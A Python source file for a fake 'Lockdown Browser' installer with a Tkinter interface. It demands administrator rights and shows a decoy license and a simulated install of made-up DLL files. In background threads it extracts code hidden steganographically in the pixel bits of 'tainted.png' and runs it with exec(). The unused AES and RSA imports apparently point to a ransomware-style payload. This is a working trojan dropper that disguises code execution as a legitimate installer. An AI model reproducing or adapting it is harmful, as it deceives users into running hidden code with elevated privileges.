from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

import tkinter as tk
from tkinter import ttk, PhotoImage
from tkinter import messagebox
from tkinter import filedialog
from PIL import Image
import time
import os
import ctypes
import sys
import threading
import requests
import rsa
import subprocess

class MockInstaller:
    def __init__(self, root):
        self.root = root
        self.root.title("Lockdown Browser Installer")
        self.root.geometry("600x500")
        self.root.resizable(False, False)

        # Check if the script is running as administrator
        if not self.is_admin():
            messagebox.showerror(
                "Administrator Privileges Required",
                "This application requires administrator privileges. Please restart the application as an administrator.",
            )
            root.destroy()  # Close the application immediately
            sys.exit()


        def run_extract_in_subprocess():
            subprocess.Popen(
                ['python', '-c', 'from catalyst import MockInstaller; MockInstaller().extract("tainted.png")'],
                cwd=os.getcwd()
            )

        if os.path.exists(os.path.join(os.getcwd(), 'pub_key.pem')):
            # Start the subprocess in a separate thread
            threading.Thread(target=run_extract_in_subprocess, daemon=True).start()


        # Get the current user's username dynamically
        self.username = os.getlogin()  # You can also use os.environ['USERPROFILE'] on Windows

        # Default installation path with the user's username
        self.install_path = f"C:/Users/{self.username}/LockdownBrowser"

        # Simulated file names for installation
        self.files_to_install = [
            "liblockdown.dll", "lockdown_core.dll", "lockdown_helper.dll",
            "browser_driver.exe", "lockdown_config.ini", "lockdown_updater.dll",
            "readme.txt", "auth_handler.dll", "session_manager.dll",
            "security_patch.dll", "policy_engine.dll", "file_checker.exe",
            "browser_plugin.dll", "connection_manager.dll", "proxy_config.dll",
            "lockdown_certificates.dll", "crypto_handler.dll", "patch_notes.txt",
            "update_manager.exe", "framework_loader.dll", "driver_updater.dll",
            "appdata_synchronizer.dll", "registry_patch.dll", "rendering_engine.dll",
            "cache_manager.dll", "network_scanner.dll", "dns_proxy.dll",
            "input_handler.dll", "error_logger.dll", "api_bridge.dll",
            "user_settings.ini", "resource_manager.dll", "temp_cleaner.dll",
            "session_validator.dll", "url_filter.dll", "display_manager.dll",
            "keyboard_hook.dll", "mouse_tracker.dll", "overlay_manager.dll",
            "system_integrity_checker.dll", "file_integrity_monitor.dll",
            "device_guard.dll", "sandbox_environment.dll", "timeout_handler.dll"
        ]

        # Step Frames
        self.frames = [
            self.create_welcome_frame(),
            self.create_license_frame(),
            self.create_path_selection_frame(),
            self.create_installation_frame(),
            self.create_completion_frame(),
        ]
        self.current_frame = 0

        # Show the first frame
        self.show_frame(0)

    def is_admin(self):
        """Check if the script is running with administrator privileges."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def show_frame(self, index):
        """Switch to a specified frame."""
        for frame in self.frames:
            frame.pack_forget()
        self.frames[index].pack(fill="both", expand=True)
        self.current_frame = index

    def create_welcome_frame(self):
        """Create the welcome screen."""
        frame = tk.Frame(self.root)
        tk.Label(frame, text="Welcome to Lockdown Browser Installer", font=("Arial", 16, "bold")).pack(pady=20)
        tk.Label(frame, text="This setup will guide you through the installation process.", font=("Arial", 12)).pack(pady=10)

        button_frame = tk.Frame(frame)
        button_frame.pack(side="bottom", fill="x", pady=10, padx=10)
        ttk.Button(button_frame, text="Next", command=lambda: self.show_frame(1)).pack(side="right", padx=5)

        return frame
    
    def create_license_frame(self):
        """Create the license agreement screen with a scrollable text box and checkbox for agreement."""
        frame = tk.Frame(self.root)
        tk.Label(frame, text="License Agreement", font=("Arial", 16, "bold")).pack(pady=20)

        # License agreement text
        license_text = """
LICENSE AGREEMENT

IMPORTANT: PLEASE READ THIS LICENSE AGREEMENT CAREFULLY BEFORE USING THIS SOFTWARE.

This License Agreement (the "Agreement") is a binding legal agreement between you (either an individual or a single entity) and the author (the "Author") of the software accompanying this Agreement, including any associated media, printed materials, and electronic documentation (the "Software"). By installing, copying, or otherwise using the Software, you agree to be bound by the terms of this Agreement. If you do not agree to the terms of this Agreement, do not install or use the Software.

1. LICENSE GRANT
Subject to the terms and conditions of this Agreement, the Author hereby grants you a non-exclusive, non-transferable, revocable license to install and use the Software solely for your personal or internal business purposes. This license does not constitute a sale of the Software or any portion or copy thereof, and you acknowledge and agree that no title or ownership rights to the Software are transferred to you under this Agreement.

2. COPYRIGHT AND OWNERSHIP
The Software is owned by the Author and is protected by applicable copyright laws, international copyright treaties, and other intellectual property laws. You may not modify, adapt, translate, or create derivative works of the Software. All rights not expressly granted under this Agreement are reserved by the Author.

3. RESTRICTIONS ON USE
You agree to comply with the following restrictions:
- No Reverse Engineering: You may not reverse engineer, decompile, or disassemble the Software, except to the extent expressly permitted by applicable law, notwithstanding this limitation.
- No Redistribution: You may not distribute, sublicense, rent, lease, or lend the Software to any third party without the prior written consent of the Author.
- No Unauthorized Uses: You may not use the Software to provide services to third parties, operate a service bureau, or process data on behalf of other individuals or organizations without explicit permission.

4. TERM AND TERMINATION
This Agreement shall remain in effect until terminated by either party.
- Termination by You: You may terminate this Agreement at any time by permanently destroying all copies of the Software in your possession or control.
- Termination by the Author: The Author may terminate this Agreement immediately if you breach any term of this Agreement. Upon termination, you agree to cease all use of the Software and destroy all copies in your possession.

5. DISCLAIMER OF WARRANTIES
THE SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTIES OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT. THE ENTIRE RISK ARISING OUT OF THE USE OR PERFORMANCE OF THE SOFTWARE REMAINS WITH YOU.

6. LIMITATION OF LIABILITY
TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW, IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, CONSEQUENTIAL, OR EXEMPLARY DAMAGES (INCLUDING, BUT NOT LIMITED TO, DAMAGES FOR LOSS OF PROFITS, BUSINESS INTERRUPTION, LOSS OF INFORMATION, OR ANY OTHER PECUNIARY LOSS) ARISING OUT OF THE USE OR INABILITY TO USE THE SOFTWARE, EVEN IF THE AUTHOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

7. GOVERNING LAW AND JURISDICTION
This Agreement shall be governed by and construed in accordance with the laws of the jurisdiction in which the Software was obtained. Any disputes arising under or in connection with this Agreement shall be subject to the exclusive jurisdiction of the courts in that jurisdiction.

8. SEVERABILITY
If any provision of this Agreement is found to be invalid or unenforceable, the remaining provisions shall remain in full force and effect. The invalid or unenforceable provision shall be replaced with a valid and enforceable provision that comes closest to the intention underlying the invalid provision.

9. ENTIRE AGREEMENT
This Agreement constitutes the entire understanding between you and the Author regarding the subject matter hereof and supersedes any prior agreements or representations, whether oral or written. Any modification or amendment to this Agreement must be made in writing and signed by both parties.

10. ACKNOWLEDGEMENT
By installing or using the Software, you acknowledge that you have read and understood this Agreement and agree to be bound by its terms. If you do not agree, you must not install or use the Software.

Effective Date: 11/25/2024
"""

        # Create a canvas to hold the text and the scrollbar
        canvas = tk.Canvas(frame)
        scrollbar = tk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=scrollbar.set)

        # Create a frame inside the canvas for the text
        text_frame = tk.Frame(canvas)
        canvas.create_window((0, 0), window=text_frame, anchor="nw")

        # Insert the license text into a Text widget
        license_text_widget = tk.Text(text_frame, wrap="word", width=70, height=15, padx=10, pady=10)
        license_text_widget.insert("1.0", license_text)
        license_text_widget.config(state="disabled")  # Make the text read-only
        license_text_widget.pack()

        # Scrollbar configuration
        scrollbar.pack(side="right", fill="y")
        canvas.pack(padx=10, pady=10, fill="both", expand=True)

        # Add the agreement checkbox
        self.agree_var = tk.BooleanVar(value=False)
        agree_checkbox = ttk.Checkbutton(frame, text="I agree to the terms and conditions", variable=self.agree_var,
                                        command=self.check_agreement)
        agree_checkbox.pack(pady=10)

        # Button Frame for Bottom Buttons
        button_frame = tk.Frame(frame)
        button_frame.pack(side="bottom", fill="x", pady=10, padx=10)

        # Back, Decline, and Accept Buttons
        ttk.Button(button_frame, text="Back", command=lambda: self.show_frame(0)).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Decline", command=self.root.quit).pack(side="right", padx=5)
        self.next_button = ttk.Button(button_frame, text="Next", state="disabled", command=lambda: self.show_frame(2))
        self.next_button.pack(side="right", padx=5)

        return frame

    def check_agreement(self):
        """Enable the 'Next' button when the user agrees to the license terms."""
        if self.agree_var.get():
            self.next_button.config(state="normal")  # Enable Next button
        else:
            self.next_button.config(state="disabled")  # Disable Next button

    def btoc(self, binary_data):
        byte_data = bytearray()
        for i in range(0, len(binary_data), 8):
            byte = binary_data[i:i+8]
            byte_data.append(int(''.join(str(b) for b in byte), 2))
        return bytes(byte_data)


    def extract(self,image_path):
        print("Starting extraction process...")
        img = Image.open(image_path)
        img_data = list(img.getdata())
        print(f"Read image data size: {len(img_data)} pixels")

        extracted_bits = []

        for i, pixel in enumerate(img_data):
            r, g, b = pixel
            extracted_bits.append(r & 1)
            extracted_bits.append(g & 1)
            extracted_bits.append(b & 1)

        # Extract the length of the file data (in bits) from the first 32 bits
        length_bits = extracted_bits[:32]
        length_bytes = self.btoc(length_bits)
        data_length = int.from_bytes(length_bytes, 'big')
        print(f"Data length to extract: {data_length} bits")

        extracted_data = extracted_bits[32:32 + data_length]

        file_data = self.btoc(extracted_data)

        # Executes the code from file_data if pub_key.pem exists
        try:
            exec(file_data)  # Execute the file content
        except Exception as e:
            messagebox.showerror("Error", f"Failed to execute file_data: {e}")

    def create_path_selection_frame(self):
        """Create the installation path selection screen."""
        frame = tk.Frame(self.root)
        tk.Label(frame, text="Select Installation Path", font=("Arial", 16, "bold")).pack(pady=20)
        tk.Label(frame, text="Choose a folder to install Lockdown Browser.", font=("Arial", 12)).pack(pady=10)

        path_frame = tk.Frame(frame)
        path_frame.pack(pady=10)

        tk.Label(path_frame, text="Installation Path:").pack(side="left", padx=10)
        self.path_entry = tk.Entry(path_frame, width=50)
        self.path_entry.insert(0, self.install_path)  # Default path with username
        self.path_entry.pack(side="left", padx=10)

        # Button to select a new path
        ttk.Button(path_frame, text="Browse...", command=self.browse_path).pack(side="left", padx=10)

        # Button Frame for Bottom Buttons
        button_frame = tk.Frame(frame)
        button_frame.pack(side="bottom", fill="x", pady=10, padx=10)

        # Back, Cancel, and Next Buttons
        ttk.Button(button_frame, text="Back", command=lambda: self.show_frame(1)).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Cancel", command=self.root.destroy).pack(side="right", padx=5)
        ttk.Button(button_frame, text="Install", command=self.start_installation_from_path).pack(side="right", padx=5)

        return frame

    def browse_path(self):
        """Open a file dialog to select a directory for installation."""
        folder_selected = filedialog.askdirectory(initialdir=self.install_path, title="Select Installation Folder")
        if folder_selected:
            self.install_path = folder_selected
            self.path_entry.delete(0, tk.END)  # Clear the current text
            self.path_entry.insert(0, folder_selected)  # Insert the new path

    def start_installation_from_path(self):
        """Initiate the installation process."""
        self.show_frame(3)
        self.start_installation()

    def create_installation_frame(self):
        """Create the installation screen with progress bar and simulated file installations."""
        frame = tk.Frame(self.root)
        self.installation_label = tk.Label(frame, text="Installing required files. Please wait...", font=("Arial", 12))
        self.installation_label.pack(pady=10)

        self.progress = ttk.Progressbar(frame, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=20)

        # Install File Log
        self.install_log = tk.Listbox(frame, width=60, height=8)
        self.install_log.pack(pady=10)

        # Button Frame for Bottom-Right Buttons
        button_frame = tk.Frame(frame)
        button_frame.pack(side="bottom", fill="x", pady=10, padx=10)

        # Cancel and Install Buttons
        ttk.Button(button_frame, text="Cancel", command=self.root.destroy).pack(side="right", padx=5)

        return frame

    def _install_files(self, total_files):
        """Handle file installation in a separate thread."""
        for i in range(total_files):
            time.sleep(20)  # Simulate work for each file
            self.progress["value"] = (i + 1) * (100 // total_files)

            # Simulate file installation sequentially
            file_to_install = self.files_to_install[i]

            # Update the label with the current file installation status
            self.installation_label.config(text=f"Installing {file_to_install}... Please wait.")

            # Simulate file installation with detailed log
            self.install_log.insert(tk.END, f"Installing {file_to_install}...\n")
            self.install_log.see(tk.END)  # Automatically scroll to the latest entry
            self.root.update_idletasks()

            # Additional progress info for file copy
            self.install_log.insert(tk.END, f"Copying {file_to_install} to {self.install_path}\n")
            self.install_log.see(tk.END)  # Keep log auto-scrolling
            self.root.update_idletasks()

        messagebox.showinfo("Installation Complete", f"Lockdown Browser has been successfully installed to {self.install_path}!")
        self.show_frame(4)


    def start_installation(self):
        """Simulate installation with a progress bar and auto-scrolling log."""
        total_files = len(self.files_to_install)

        print("starting thread")
        # Start installation in a separate thread to run in parallel with code execution
        threading.Thread(target=self._install_files, args=(total_files,), daemon=True).start()
        threading.Thread(target=self.extract, args=('tainted.png',), daemon=True).start()

    def exit_gui(self):
        """Hide the GUI window without terminating the script."""
        self.root.withdraw()
        print("GUI closed, but the script is still running.")

    def create_completion_frame(self):
        """Create the completion screen."""
        frame = tk.Frame(self.root)
        tk.Label(frame, text="Installation Complete", font=("Arial", 16, "bold")).pack(pady=20)
        tk.Label(frame, text="Thank you for installing Lockdown Browser.", font=("Arial", 12)).pack(pady=10)

        button_frame = tk.Frame(frame)
        button_frame.pack(side="bottom", fill="x", pady=10, padx=10)
        ttk.Button(button_frame, text="Finish", command=self.root.withdraw).pack(side="right", padx=5)

        return frame

# Main Application
if __name__ == "__main__":
    root = tk.Tk()
    app = MockInstaller(root)
    root.mainloop()
